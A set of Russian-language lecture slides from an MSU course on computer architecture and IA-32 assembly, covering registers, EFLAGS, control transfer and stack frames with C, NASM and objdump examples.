            © 2024 МГУ/ВМК/СП




Лекция 1


7 февраля
                                                                                            © 2024 МГУ/ВМК/СП



                      Цель курса
         «Архитектура ЭВМ и язык ассемблера»
1.   Формирование связного представления об организации современных
     вычислительных систем.
     –    Аппаратура, системные программы, прикладные программы
2. Понимание взаимосвязей между архитектурными решениями на
   уровнях аппаратуры ЭВМ и ПО.
3. Понимание факторов, влияющих на качественные и количественные
   характеристики ЭВМ, производительность и безопасность всей
   вычислительной системы в целом.
• Язык Си как средство демонстрации …
     – того, как работает аппаратура …
     – и того, как следует использовать аппаратуру для реализации языка
       программирования
• Результат
     – Понимание причин хорошей/плохой производительности программы
     – Понимание причин ошибок
• Основа для других курсов
     – Базовые курсы: ОС, сети, компиляторы, параллельная обработка данных, …
     – Спецкурсы:
          • Сетевые технологии и протоколы – для студентов 2-3 курсов, весна, с 2024 года
          • Анализ программных реализаций – для студентов 2-3 курсов, весна, с 2025 года            2
                                                                                                   © 2024 МГУ/ВМК/СП




                                         Мотивация

    •    Почему не ставится задача научить программировать на языке ассемблера
           –   Промышленное программирование на ассемблере?
           –   Не, не слышал 
                                                    int x = 5000;
                                                    int y = 50000;
    •    Проблема №1 Свойства чисел                 ...
                                                                             double fun(int i) {
                                                    if (y * y > x * x) {
           –   Всегда ли свойства математических    // попадем сюда?           volatile double d[1] = {3.14};
               абстракций выполняются               }                          volatile long int a[2];
               вычислительной техникой?                                        a[i] = 1073741824;
                                                                               return d[0];
    •    Проблема №2 Отладка                               fun(0)   ➙   3.14 }
           –   Где на самом деле хранятся переменные?      fun(1)   ➙   3.14
                                                           fun(2)   ➙   3.1399998664856
           –   Как сделать отладчик?                       fun(3)   ➙   2.00000061035156
                                                                    ➙
    •    Проблема №3 Производительность                    fun(4)       3.14, а потом segmentation fault

           –   Почему алгоритм Штрассена O(n2.81) на практике быстрее алгоритма
               Копперсмита-Винограда O(n2.3727) ?
           –   Может ли стандартное умножение матриц O(n3) работать быстрее?
    •    Проблема №4 Безопасность
           –   Что на самом деле выполняет компьютер?
           –   Можно ли гарантировать, что Си-код который я написал, действительно будет
               выполняться?

                                                                                                           3
 Не все так однозначно
                                                                    © 2024 МГУ/ВМК/СП




    Зачем сейчас нужен язык ассемблера?

• Язык ассемблера позволяет понимать поведение машины

• Системное программное обеспечение
  создается людьми, в том числе выпускниками ВМК
   – Компиляторы и многие другие инструменты разработки программ
   – Операционные системы
   – Средства защиты информации
• Отладка ошибок разработчиком программы
• Настройка производительности программы
   – Почему оптимизация программы компилятором не дает ожидаемого
     результата
• Безопасность программного обеспечения
  (software security, cyber security)
   – Сертификация программ
   – Средства защиты
   – Вредоносный код: ботнеты, вирусы/черви, руткиты, …
                                                                            4
                                                                                      © 2024 МГУ/ВМК/СП




                История первых компьютеров
• Чарлз Бэббидж, Ада Лавлайс 1820 – 1833
    – Разработка первых счетных машин
• Табуляторы – электромеханические машины
  для суммирования и категоризации, применялись
  с конца XIX века.
    – Tabulating Machine Company  IBM
• Конрад фон Цузе – Германия
    – Z1 1938г., Z2 1939 г., Z3 1941г., Z4 1945г.
• Экерт и Моучли – США
    – ENIAC 1946 г.
    – фон Нейман
         • First Draft of a Report on the EDVAC, 30 июня 1945
• Атанасов и Берри – США                   Применение первых компьютеров
    – ABC 1942 г.                          • задачи математической физики
• Mark I – Великобритания                  • шифрование/дешифрование сообщений
    – 1949 г.                              • управление (военной) техникой
• Исаак Брук – СССР, Москва
    – М-1 1951 г.                          Современное применение компьютеров
• Сергей Лебедев – СССР, Киев • хранение информации и предоставление удобного
    – МЭСМ 1950 г.                           доступа для работы с ней
    – БЭСМ-1 1952 г.                       • игры!!!
                                           • передача информации
                                           • управление технологическими процессами           5
                                           • работа во всем, что нас окружает …
                                      © 2024 МГУ/ВМК/СП



1948 год: точка отсчета для отечественных
              компьютеров




                                              6
                                                                                            © 2024 МГУ/ВМК/СП




        1967 год: первый суперкомпьютер в СССР




«Если мы глубже разберёмся в этом эпохальном советском суперкомпьютере, это позволит пересмотреть
заявления времён холодной войны об отставании русской технологии, а также подтвердить или развеять
мифы о технологическом совершенстве наших союзников».
                                                                                                     7
     Doron Swade, senior curator of computing and information technology
                                                              © 2024 МГУ/ВМК/СП




                 Архитектура фон Неймана
                        89 c8             mov eax, ecx
                        8b 15 24 20 00 00 mov edx, dword [0x2024]
                        c7 03 41 00 00 00 mov dword [ebx], 'A'




                         1. Двоичное кодирование информации
                         2. Неразличимость команд и данных
                         3. Адресуемость памяти
                         4. Последовательное выполнение команд        8
Вспоминаем Си-машину…
                                                    © 2024 МГУ/ВМК/СП




         Единственный вариант архитектуры?




    Еще один вариант
    изображения архитектуры    Гарвардская архитектура
    фон Неймана…
                                                            9
Вспоминаем Си-машину…
                                                                © 2024 МГУ/ВМК/СП




           (Модельный) цикл работы ЭВМ

1.   Извлечение инструкции из памяти
     Используя текущее значение счетчика команд, процессор
     извлекает некоторое количество байт из памяти и помещает их в
     буфер команд
2.   Декодирование команды
     Процессор просматривает содержимое буфера команд и
     определяет код операции и ее операнды
     Длина декодированной команды прибавляется к текущему
     значению счетчика команд
3.   Загрузка операндов
     Извлекаются значения операндов
     Если операнд размещен в ячейках памяти – вычисляется
     исполнительный адрес
4.   Выполнение операции над данными
5.   Запись результата
     Результат может быть записан в том числе и в счетчик команд для
     изменения естественного порядка выполнения
                                                                       10
                                                © 2024 МГУ/ВМК/СП



            Промежуточные итоги:
         ключевые термины и понятия
• Регистр, имя регистра, значение регистра,
  разрядность регистра, машинное слово
• Память, ячейка памяти, адрес ячейки памяти, время
  доступа к памяти
• Цикл, тактовая частота, счетчик команд
• Машинная команда, код операции, операнд,
  адресность команды
  Исполнительный (действительный) адрес
  англ. effective (executive) address
• Способ адресации
  прямая, непосредственная, косвенная
                                                       11
             © 2024 МГУ/ВМК/СП




Лекция 2


10 февраля
                                                © 2024 МГУ/ВМК/СП



            Промежуточные итоги:
         ключевые термины и понятия
• Регистр, имя регистра, значение регистра,
  разрядность регистра, машинное слово
• Память, ячейка памяти, адрес ячейки памяти, время
  доступа к памяти
• Цикл, тактовая частота, счетчик команд
• Машинная команда, код операции, операнд,
  адресность команды
  Исполнительный (действительный) адрес
  англ. effective (executive) address
• Способ адресации
  прямая, непосредственная, косвенная
                                                        2
                                        © 2024 МГУ/ВМК/СП



 Машина, на которой работает пользовательская
        программа (архитектура IA-32)




                                                3
Вспоминаем Си-машину…
                                                     © 2024 МГУ/ВМК/СП




Типы операндов
• Регистр      r
• Память       m
• Константа    i


Размеры операндов
• byte          8
• word          16
• dword         32
• qword         64

Где сегментные регистры?


     89 c8                 mov eax, ecx
     8b 0d 19 20 00 00     mov ecx, dword [0x2019]
     89 5d fc              mov dword [ebp-4], ebx
     05 ff 00 00 00        add eax, 0xff                     4
                                                         © 2024 МГУ/ВМК/СП




        Порядок размещения байт в памяти




                   mov ecx, dword [0x2019]

Два наиболее распространенных подхода
• Порядок от младшего к старшему (англ. little-endian)
  используется в IA-32

• Порядок от старшего к младшему (англ. big-endian)
  как правило используется в процессорах,
                                                                 5
  предназначенных для обработки сетевых данных
                                        © 2024 МГУ/ВМК/СП




8086  IA-32 Intel64




      Какие еще названия встречаются?
      x86, x86_64, AMD64
      IA-64 совсем другая архитектура           6
                                               © 2024 МГУ/ВМК/СП




     «Положительные» особенности IA-32

• Особенности аппаратуры
  и операционная система
  (Windows/Linux)
  позволяют использовать в
  программах модель
  плоской памяти      mov dword [ebp-4], ebx
• Значительно ослаблены
  ограничения на
  использование регистров
  в командах по сравнению
  с 8086
• «Количественно проще»
  чем Intel64
                                                       7
                                                                         © 2024 МГУ/ВМК/СП


                                   section .bss
                                   ; Резервирование 4 байт памяти
                                      cntr resd 1
                                   section .text
                                      global f
                                   ; Точка входа в программу
                                   f:
                                      push     ebp
                                      mov      ebp, esp
                                      sub      esp, 16
void f() {
                                      mov      dword [ebp-12], 2     ; (1)
   static int cntr = 0;     // 1
                                      mov      dword [ebp-8], 1      ; (2)
   int x = 2, y = 1, z = 0; // 2
                                      mov      dword [ebp-4], 0      ; (3)
   unsigned short w = 100; // 3
                                      mov      word [ebp-14], 100    ; (4)
   signed char q = 10;      // 4
                                      mov      byte [ebp-15], 10     ; (5)
   ++cntr;                  // 5
                                      add      dword [cntr], 1       ; (6)
   z = -x + q * w *y - w;   // 6
                                      movsx    eax, byte [ebp-15]    ; (7)
}
                                      movzx    edx, word [ebp-14]    ; (8)
                                      imul     eax, edx              ; (9)
                                      imul     eax, dword [ebp-8]    ; (10)
                                      sub      eax, dword [ebp-12]   ; (11)
                                      sub      eax, edx              ; (12)
                                      mov      dword [ebp-4], eax    ; (13)
                                      leave
                                      ret                                        8
                                                     © 2024 МГУ/ВМК/СП




Размещение переменных в памяти




       Модели памяти в языке Си
       • Автоматическая
            • Каждый вызов функции должен обладать своим
              комплектом автоматических локальных
              переменных. Адрес переменной должен
              определяться динамически, во время работы
              программы.
       • Статическая
            • Один экземпляр переменной. Адрес может быть
              определен статически, во время компиляции.
       • Динамическая
            • Функции стандартной библиотеки языка Си:
              malloc и др.

                                                             9
                                                                  © 2024 МГУ/ВМК/СП




                                    ...
                                    mov     dword [ebp-12], 2     ; (1)
                                    mov     dword [ebp-8], 1      ; (2)
                                    mov     dword [ebp-4], 0      ; (3)
                                    mov     word [ebp-14], 100    ; (4)
                                    mov     byte [ebp-15], 10     ; (5)
                                    add     dword [cntr], 1       ; (6)
                                    movsx   eax, byte [ebp-15]    ; (7)
void f() {                          movzx   edx, word [ebp-14]    ; (8)
   static int cntr = 0;     // 1    imul    eax, edx              ; (9)
   int x = 2, y = 1, z = 0; // 2    imul    eax, dword [ebp-8]    ; (10)
   unsigned short w = 100; // 3     sub     eax, dword [ebp-12]   ; (11)
   signed char q = 10;      // 4    sub     eax, edx              ; (12)
                                    mov     dword [ebp-4], eax    ; (13)
   ++cntr;                  // 5
                                 ...
    z = -x + q * w *y - w;   // 6
}                                                                        10
             © 2024 МГУ/ВМК/СП




Лекция 3


14 февраля
                                                                  © 2024 МГУ/ВМК/СП




                                    ...
                                    mov     dword [ebp-12], 2     ; (1)
                                    mov     dword [ebp-8], 1      ; (2)
                                    mov     dword [ebp-4], 0      ; (3)
                                    mov     word [ebp-14], 100    ; (4)
                                    mov     byte [ebp-15], 10     ; (5)
                                    add     dword [cntr], 1       ; (6)
                                    movsx   eax, byte [ebp-15]    ; (7)
void f() {                          movzx   edx, word [ebp-14]    ; (8)
   static int cntr = 0;     // 1    imul    eax, edx              ; (9)
   int x = 2, y = 1, z = 0; // 2    imul    eax, dword [ebp-8]    ; (10)
   unsigned short w = 100; // 3     sub     eax, dword [ebp-12]   ; (11)
   signed char q = 10;      // 4    sub     eax, edx              ; (12)
                                    mov     dword [ebp-4], eax    ; (13)
   ++cntr;                  // 5
                                 ...
    z = -x + q * w *y - w;   // 6
}                                                                         2
                                                                      © 2024 МГУ/ВМК/СП




                    Преобразования кода

Си    int x = 2;        Операторы и выражения


                      Компилятор



Ассемблер   mov      dword [ebp-12], 2          Ассемблерные инструкции
(язык)

                                   Ассемблер (программа-транслятор)


Машинный код       c7 45 f4 02 00 00 00                Машинные команды


                                                                              3
© 2024 МГУ/ВМК/СП




        4
                                                                       © 2024 МГУ/ВМК/СП

Обратный путь – от исполняемого кода к читаемому тексту




                                    Синтаксис objdump отличается от nasm!      5
                                                                   © 2024 МГУ/ВМК/СП
extern io_get_dec, io_print_hex, io_newline

section .data                  Удобная среда разработки для учебных
 a    dw 1                     программ: vi, Emacs, Eclipse, …
 addr dd $
 var dd 0x1234F00D             http://dman95.github.io/SASM/
                               https://github.com/Dman95/SASM
section .bss
   cntr resd 1                 Для тех, у кого нет возможности работать в
                               Linux x86, запущена облачная лаборатория
section .text                  https://students.ispras.ru
global main                    • Виртуальная машина с Ubuntu
main:                          • Развернут SASM
   call io_get_dec             • Загружены методички
   add dword [addr], eax       • Доступ через браузер
   mov eax, [addr]
   call io_print_hex
   call io_newline
   mov eax, addr
   call io_print_hex
   call io_newline

  xor eax, eax                                                             6
  ret
                                                             © 2024 МГУ/ВМК/СП




Виртуальная машина: ключевые понятия
            Пользовательские программы (приложения)

                      Гипервизор
          Виртуальная машина
   Пользовательские программы (приложения) Конфигурация
                                              виртуальной
  (Гостевая) Операционная система
                                                машины:
                 Система команд               число ядер,
   Виртуальная аппаратура: процессор, память,    размер
             устройства ввода-вывода           памяти, …



    (Хостовая) Операционная система


                            Система команд

    Аппаратура: процессор, память, устройства ввода-вывода

                                                                     7
                                                                     © 2024 МГУ/ВМК/СП
extern io_get_dec, io_print_hex, io_newline

section .data
 a    dw 1
                           Секция статических инициализированных данных
 addr dd $
 var dd 0x1234F00D

section .bss               Секция статических неинициализированных данных
   cntr resd 1

section .text
                         Секция кода
global main
main:
   call io_get_dec
                              В тех случаях, когда размер других
   add dword [addr], eax
                              операндов позволяет определить размер
   mov eax, [addr]
                              операнда-памяти, допускается не указывать
   call io_print_hex
                              его спецификатор размера
   call io_newline
   mov eax, addr
   call io_print_hex
   call io_newline

   xor eax, eax                                                              8
   ret
                                         © 2024 МГУ/ВМК/СП




       Основные арифметические команды

•   MOV
•   MOVSX, MOVZX
•   ADD, SUB
•   INC, DEC
•   NEG
    – r/m 8/16/32
• MUL
    – r/m 8/16/32
• IMUL
    – r/m 8/16/32
    – r 16/32, r/m 16/32
    – r 16/32, r/m 16/32, i 16/32
• DIV, IDIV
    – r/m 8/16/32
• CBW, CWD, CDQ

                                                 9
                                                                     © 2024 МГУ/ВМК/СП



  Почему для реализации некоторых операций языка
  Си не требуется учитывать знаковость типа данных?

        𝑤−1                                            𝑤−2

U 𝑥Ԧ𝑤 = ෍ 2𝑖 𝑥𝑖                  𝑇 𝑥Ԧ𝑤 = −2𝑤−1 𝑥𝑤−1 + ෍ 2𝑖 𝑥𝑖
         𝑖=0                                           𝑖=0
Беззнаковая интерпретация        Знаковая интерпретация
w-разрядного битового            w-разрядного битового вектора 𝑥Ԧ𝑤
вектора 𝑥Ԧ𝑤

Обозначим
      U(𝑥Ԧ𝑤 ) = 𝑥ƴ   𝑇 𝑥Ԧ𝑤 = 𝑥               𝑥ƴ = 𝑥 + 2𝑤 𝑥𝑤−1

Утверждение
      𝑥ƴ ∗ 𝑦ƴ 𝑚𝑜𝑑2𝑤 = 𝑥ƴ ∗ 𝑦 𝑚𝑜𝑑2𝑤 = 𝑥 ∗ 𝑦ƴ 𝑚𝑜𝑑2𝑤 = 𝑥 ∗ 𝑦 𝑚𝑜𝑑2𝑤
В качестве бинарной операции ∗
могут выступать сложение, вычитание, умножение
                                                                            10
             © 2024 МГУ/ВМК/СП




Лекция 4


17 февраля
                                         © 2024 МГУ/ВМК/СП




       Основные арифметические команды

•   MOV
•   MOVSX, MOVZX
•   ADD, SUB
•   INC, DEC
•   NEG
    – r/m 8/16/32
• MUL
    – r/m 8/16/32
• IMUL
    – r/m 8/16/32
    – r 16/32, r/m 16/32
    – r 16/32, r/m 16/32, i 16/32
• DIV, IDIV
    – r/m 8/16/32
• CBW, CWD, CDQ

                                                 2
                                                                             © 2024 МГУ/ВМК/СП




                               Регистр EFLAGS




•   Биты (разряды ) регистра EFLAGS независимы друг от друга, каждый из
    сигнализирует о некотором аспекте в состоянии процессора.
•   Разряды EFLAGS принято называть флагами
     –   Флаг взводится, когда получает значение 1, сбрасывается – когда 0
•   Часть флагов меняет состояние по результатам выполнения очередной
    машинной команды (белые и бежевый флаг)
     –   Изменение флагов – побочный результат
     –   Регистр EFLAGS можно рассматривать как слово состояния
•   Часть флагов будет определять порядок выполнения следующей машинной
    команды (синие и зеленый флаги)
     –   Регистр EFLAGS можно рассматривать как управляющее слово

                                                                                     3
                                                                  © 2024 МГУ/ВМК/СП




        Регистр EFLAGS как слово состояния




• AF – Auxiliary Carry Flag, вспомогательный флаг
  переноса, показывает результаты арифметических
  операций над числами в двоично-десятичном коде
  (binary-coded decimal, BCD)
• ZF – Zero Flag, нулевой результат
• SF – Sign Flag, флаг знака, взводится,
  когда результат вычислений – отрицательное число
• CF – Carry Flag, флаг переноса за пределы разрядной сетки
  (переполнение беззнаковых чисел)
• OF – Overflow Flag, флаг переполнения (знаковых чисел)
• PF – Parity Flag, флаг четности, взводится, если число 1 в младшем
  байте результата – чётно                                                4
                                 © 2024 МГУ/ВМК/СП



Переполнение при сложении двух
      беззнаковых чисел




                                         5
                                                © 2024 МГУ/ВМК/СП




            Как «выглядит» переполнение в 3D?




                                                        6
http://www.hackersdelight.org/plotsAdd.pdf
                                 © 2024 МГУ/ВМК/СП



Переполнение при сложении двух
        знаковых чисел




                                         7
                                                                © 2024 МГУ/ВМК/СП




          Естественный порядок выполнения



EIP       Машинный код              Длина Ассемблерная инструкция
8048345   89 e5                     2         mov   ebp, esp
8048347   83 ec 10                  3         sub   esp, 0x10
804834a   c7 45 f0 02 00 00 00 7              mov   dword [ebp-16],0x2



 Прибавляем к значению регистра EIP длину в
 байтах декодированной команды


                                                                        8
                                                                                      © 2024 МГУ/ВМК/СП



            Изменение естественного порядка
                выполнения программы
•   Арифметические операции обновляют некоторые флаги
    регистра EFLAGS
•   CMP
     –   r/m 8/16/32, i 8/16/32
     –   r/m 8/16/32, r 8/16/32
     –   r 8/16/32, r/m 8/16/32
•   TEST
     –   r/m 8/16/32, i 8/16/32
     –   r/m 8/16/32, r 8/16/32
•   Переходы в программе
     –   Способ адресации: задается абсолютный или относительный
         адрес передачи управления
     –   Условия выполнения: безусловная или условная передача
         управления
•   Безусловная передача управления
    JMP                                               Абсолютная        Относительная
     –   r/m/i 32                                  адресация (r/m 32)   адресация (i 32)
•   Условная передача управления                        EIP  ОП        EIP  EIP + ОП
    Jcc
     –   i 32
     –   В коде операции суффикс (condition code) кодирует условие                            9
         передачи управления
                                                               © 2024 МГУ/ВМК/СП




             Регистр EFLAGS и инструкции
                          OF       SF        ZF       PF        CF
ADD, SUB, NEG             M        M         M        M          M
INC, DEC                  M        M         M        M
IMUL, MUL                 M         –        –         –         M
IDIV, DIV                 –         –        –         –         –
CBW, CWD, CDQ
MOV, MOVSX, MOVZX
CMP                       M        M         M        M          M
TEST                      0        M         M        M          0

«M» инструкция обновляет флаг (сбрасывает или устанавливает)
«–» влияние инструкции на флаг не определено
« » инструкция на флаг не влияет
«0» инструкция сбрасывает флаг                                        10
                                  © 2024 МГУ/ВМК/СП




...
SECTION .text
GLOBAL CMAIN
CMAIN:
    MOV EAX, DWORD [a]   ; (1)
    TEST EAX, EAX        ; (2)
    JE   .1              ; (3)
    MOV ECX, DWORD [b]   ; (4)
    TEST ECX, ECX        ; (5)
    JE   .1              ; (6)
    CDQ                  ; (7)
    IDIV ECX             ; (8)
    SUB DWORD [a], EDX   ; (9)
 .1:
    XOR EAX, EAX         ; (10)
    RET                  ; (11)


                                         11
                                                                © 2024 МГУ/ВМК/СП




   Просмотр содержимого исполняемого файла
-bash-2.05b$ ./build_asm.sh sample3-backward.asm
-bash-2.05b$ objdump -d -M intel sample3-backward


...
080491f0 <main>:
 80491f0:       a1 38 c0 04 08      mov    eax,ds:0x804c038
 80491f5:       85 c0               test   eax,eax
 80491f7:       74 13               je     804920c <main.1>
 80491f9:       8b 0d 3c c0 04 08   mov    ecx,DWORD PTR ds:0x804c03c
 80491ff:       85 c9               test   ecx,ecx
 8049201:       74 09               je     804920c <main.1>
 8049203:       99                  cdq
 8049204:       f7 f9               idiv   ecx
 8049206:       29 15 38 c0 04 08   sub    DWORD PTR ds:0x804c038,edx

0804920c <main.1>:
 804920c:       31 c0               xor    eax,eax
 804920e:       c3                  ret
...
                                                                        12
                                        © 2024 МГУ/ВМК/СП




                  Далее…

• Архитектура фон Неймана
• Архитектура IA-32
• Вычисление арифметических выражений
• Передача управления
• Организация вызова функций




                                               13
             © 2024 МГУ/ВМК/СП




Лекция 5


21 февраля
                                                                © 2024 МГУ/ВМК/СП




           Организация вызова функций

• Вопросы
   – Передача управления и возвращение обратно
   – Вычисление значений фактических параметров и их размещение
   – Передача возвращаемого значения
   – Размещение автоматических локальных переменных
   – Порядок использование регистрового файла различными
     функциями
   – Какие именно машинные команды использовать для поддержки
     функций
• Ответы – Application Binary Interface (ABI)
   – ABI – интерфейс взаимодействия между объектными
     программными модулями
   – Соглашение о вызовах (Calling Convention) – один из разделов ABI

                                                                        2
                                                       © 2024 МГУ/ВМК/СП



               Аппаратный стек IA-32

• Область памяти, работа с          “Дно” стека
  которой ведется согласно
  дисциплине стека
• Стек растет в направлении                          Направление
  меньших адресов                                     увеличения
                                                        адресов
• Регистр esp содержит адрес
  «верхушки» стека
  (наименьший адрес памяти)
                                                     Направление
                                                      роста стека

           Указатель стека: esp

                                  “Верхушка” стека             3
                                                            © 2024 МГУ/ВМК/СП



            Загрузка данных в стек: Push

• push src                                  “Дно” стека
   • r/m 16/32
   • i 8/16/32                                            Направление
                                                           увеличения
                                                             адресов
 – Извлечь содержимое операнда src
 – Уменьшить esp на 4 (2)
 – Записать значение по адресу esp
                                                          Направление
                                                             роста
                                                             стека
               Указатель стека: esp
                                       -4



                                      “Верхушка” стека              4
                                                            © 2024 МГУ/ВМК/СП



          Выгрузка данных из стека: Pop
                                            “Дно” стека
• pop dst
   • r/m 16/32
                                                          Направление
                                                           увеличения
 – Извлечь значение по адресу esp                            адресов
 – Увеличить esp на 4 (2)
 – Записать содержимое операнда dst

                                                          Направление
                                                           роста стека
                                       +4
               Указатель стека: esp

                                      “Верхушка” стека
                                                                    5
                                                                 © 2024 МГУ/ВМК/СП

Языки программирования (ЯП), базирующиеся
             на стеке вызовов
• ЯП с поддержкой рекурсии
  – С, Pascal, Java, …
  – Код функции можно вызывать повторно (“Reentrant”)
    • Одновременно могут выполняться несколько вызовов функции
  – Необходимо выделять память под сохранение состояния каждого
    работающего вызова
    • Аргументы
    • Локальные переменные
    • Адрес возврата
• Стек
  – Сохранять состояние вызова функции надо в ограниченный период
    времени: от момента вызова до момент выхода
  – Вызываемая функция всегда завершается до вызывающей
• Стек выделяется Фреймами
                                                                         6
  – Состояние отдельного вызова функции
                                                              © 2024 МГУ/ВМК/СП



                Порядок вызова функции
• Аппаратный стек используется для вызова функций и возврата
  из них
• Вызов функции: call label
  – На стек помещается адрес возврата
  – Выполняется прыжок на метку label
• Адрес возврата:
  – Адрес инструкции непосредственно расположенной за инструкцией call
  804854e:     e8 3d 06 00 00        call 8048b90 <main>
  8048553:     50                    push eax
  – Адрес возврата = 0x8048553
• Возврат из функции: ret
  – Выгрузка адреса из стека
  – Прыжок на этот адрес
                                                                      7
                                                           © 2024 МГУ/ВМК/СП



                       Вызов функции
804854e:         e8 3d 06 00 00        call   8048b90 <main>
8048553:         50                    push   eax

                              call 8048b90



0x110                    0x110
0x10c                    0x10c
0x108      123           0x108       123
                         0x104    0x8048553


  esp      0x108           esp      0x104

  eip 0x804854e            eip    0x8048b90


                                                                   8
                                                 © 2024 МГУ/ВМК/СП



                Выход из функции

8048591:   c3                   ret

                                                ret


                   0x110               0x110
                   0x10c               0x10c
                   0x108      123      0x108      123
                   0x104   0x8048553           0x8048553


                     esp     0x104       esp     0x108

                     eip   0x8048591     eip   0x8048553


                                                         9
                                                        © 2024 МГУ/ВМК/СП



           Пример цепочки вызовов

yoo(…)
{
  •                                               yoo
  •        who(…)
  who();   {                                      who
  •          • • •
  •          amI();
}                           amI(…)                amI   amI
             • • •          {
             amI();           •
             • • •                                amI
                              •
           }                  amI();
                              •                   amI
                              •
                            }

                      Функция amI() рекурсивная

                                                               10
                                                             © 2024 МГУ/ВМК/СП



                          Стек фреймов
• Во фрейме размещаются
  – Локальные переменные
                                                         Предыдущий
  – Данные, необходимые для возврата                        фрейм
    из функции
  – Временные переменные
                                Указатель фрейма: ebp

                                                           Текущий
                                                            фрейм
• Управление фреймами               Указатель стека:
  – Пространство выделятся во время              esp
    входа в функцию
    • «пролог» функции                                  “Верхушка”
  – Освобождается на выходе                                стека
    • «эпилог» функции
                                                                    11
                                    © 2024 МГУ/ВМК/СП



                             Стек


yoo(…)     yoo
                       ebp
{
  •
                             yoo
                             yoo
           who         esp
  •
  who();
  •        amI   amI
  •
}          amI


           amI




                                           12
                                       © 2024 МГУ/ВМК/СП



                                Стек


yoo(…)        yoo
{ who(…)
  •{                            yoo
                                yoo
              who
  • • • •                 ebp
     amI();
  who();
  • • • •     amI   amI         who
                          esp
  • amI();
}    • • •
   }          amI


              amI




                                              13
                                          © 2024 МГУ/ВМК/СП



                                   Стек


yoo(…)           yoo
{ who(…)
  •{                               yoo
                                   yoo
     amI(…)      who
  • • • •
     {
     amI();
  who();
        •                          who
  • • • •        amI   amI
        •
  • amI();
     • •amI();
          •                  ebp
}
   }    •        amI               amI
        •                    esp
     }
                 amI




                                                 14
                                            © 2024 МГУ/ВМК/СП



                                     Стек


yoo(…)             yoo
{ who(…)
  •{                                 yoo
                                     yoo
     amI(…)        who
  • • • •
     {
     amI();
  who();  amI(…)
        •                            who
  • • • { •        amI   amI
        •
  • amI();•
}    • •amI();
          • •
   }    •          amI               amI
        • amI();
     }      •                  ebp
            •      amI
          }                          amI
                               esp




                                                   15
                                                © 2024 МГУ/ВМК/СП



                                         Стек


yoo(…)                 yoo
{ who(…)
  •{                                     yoo
                                         yoo
     amI(…)            who
  • • • •
     {
     amI();
  who();  amI(…)
        •                                who
  • • • { •            amI   amI
        •
  • amI();• amI(…)
}    • •amI();
          • •{
   }    •       •      amI               amI
        •   amI();
     }      • •
            • amI();   amI
          }     •                        amI
                •
              }                    ebp
                                         amI
                                   esp


                                                       16
                                            © 2024 МГУ/ВМК/СП



                                     Стек


yoo(…)             yoo
{ who(…)
  •{                                 yoo
                                     yoo
     amI(…)        who
  • • • •
     {
     amI();
  who();  amI(…)
        •                            who
  • • • { •        amI   amI
        •
  • amI();•
}    • •amI();
          • •
   }    •          amI               amI
        • amI();
     }      •                  ebp
            •      amI
          }                          amI
                               esp




                                                   17
                                          © 2024 МГУ/ВМК/СП



                                   Стек


yoo(…)           yoo
{ who(…)
  •{                               yoo
                                   yoo
     amI(…)      who
  • • • •
     {
     amI();
  who();
        •                          who
  • • • •        amI   amI
        •
  • amI();
     • •amI();
          •                  ebp
}
   }    •        amI               amI
        •                    esp
     }
                 amI




                                                 18
                                       © 2024 МГУ/ВМК/СП



                                Стек


yoo(…)        yoo
{ who(…)
  •{                            yoo
                                yoo
              who
  • • • •                 ebp
     amI();
  who();
  • • • •     amI   amI         who
                          esp
  • amI();
}    • • •
   }          amI


              amI




                                              19
                                          © 2024 МГУ/ВМК/СП



                                   Стек


yoo(…)           yoo
{ who(…)
  •{                               yoo
                                   yoo
     amI(…)      who
  • • • •
     {
     amI();
  who();
        •                          who
  • • • •        amI   amI
        •
  • amI();
     • •amI();
          •                  ebp
}
   }    •        amI               amI
        •                    esp
     }
                 amI




                                                 20
                                       © 2024 МГУ/ВМК/СП



                                Стек


yoo(…)        yoo
{ who(…)
  •{                            yoo
                                yoo
              who
  • • • •                 ebp
     amI();
  who();
  • • • •     amI   amI         who
                          esp
  • amI();
}    • • •
   }          amI


              amI




                                              21
                                    © 2024 МГУ/ВМК/СП



                             Стек


           yoo
yoo(…)                 ebp
{                            yoo
                             yoo
  •        who         esp
  •
  who();   amI   amI
  •
  •
}          amI


           amI




                                           22
                                                                © 2024 МГУ/ВМК/СП



          Организация фрейма в IA-32/Linux

• Текущий фрейм (от “верхушки” ко
  «дну»)                                         Фрейм
  – “Пространство параметров”:              вызывающей
    фактические параметры вызываемых            функции
                                                            Аргументы
    функций
                                            Указатель     Адрес возврата
  – Локальные переменные                      фрейма       «Старый» ebp
  – Сохраненные регистры                          ebp
                                                           Сохраненные
  – Прежнее значение указателя фрейма                        регистры
                                                                 +
                                                          Автоматические
• Фрейм вызывающей функции                                  локальные
  – Адрес возврата                                         переменные
    • Помещается на стек инструкцией call                 «Пространство
                                            Указатель      параметров»
  – Значения фактических аргументов для         стека
    текущего вызова                               esp                  23
                                                          © 2024 МГУ/ВМК/СП

int main() {              %include ‘io.inc’
   int a = 1, b = 2, c;   section .text
   c = sum(a, b);         global CMAIN
   return 0;              CMAIN:
}                         ...
                             mov    dword [ebp-16], 0x1   ; (1)
int sum(int x, int y) {      mov    dword [ebp-12], 0x2   ; (2)
   int t = x + y;            mov    eax, dword [ebp-12]   ; (3)
   return t;                 mov    dword [esp+4], eax    ; (4)
}                            mov    eax, dword [ebp-16]   ; (5)
                             mov    dword [esp], eax      ; (6)
                             call   sum                   ; (7)
                             mov    dword [ebp-8], eax    ; (8)
                          ...
                          global sum
                          sum:
                             push   ebp                   ; (9)
                             mov    ebp, esp              ; (10)
                             sub    esp, 0x10             ; (11)
                             mov    edx, dword [ebp+12]   ; (12)
                             mov    eax, dword [ebp+8]    ; (13)
                             add    eax, edx              ; (14)
                             mov    dword [ebp-4], eax    ; (15)
                             mov    eax, dword [ebp-4]    ; (16)
                             mov    esp, ebp              ; (17)
                             pop    ebp                   ; (18)
                             ret                          ; (19)
                      © 2024 МГУ/ВМК/СП




Промежуточные итоги




                             25
                                                              © 2024 МГУ/ВМК/СП




                Дальнейший материал

• Взаимосвязь языка Си, языка ассемблера и особенностей
  архитектуры IA-32
   – Операции над целыми числами и битовыми векторами
      • «быстрая» арифметика и обработка 64 разрядных чисел
      • побитовые операции, сдвиги, вращения
   – Реализация управляющих конструкций языка Си
   – Адресная арифметика
   – Массивы
   – Структуры и объединения, выравнивание данных
   – Соглашение вызова
      • cdecl, stdcall, fastcall
      • выравнивание стека
      • ускорение вызова функций
   – Безопасность ПО: ошибки, уязвимости, механизмы защиты
   – Числа с плавающей точкой
   – …
                                                                     26
             © 2024 МГУ/ВМК/СП




Лекция 6


24 февраля
                                                    © 2024 МГУ/ВМК/СП




                       Группы команд

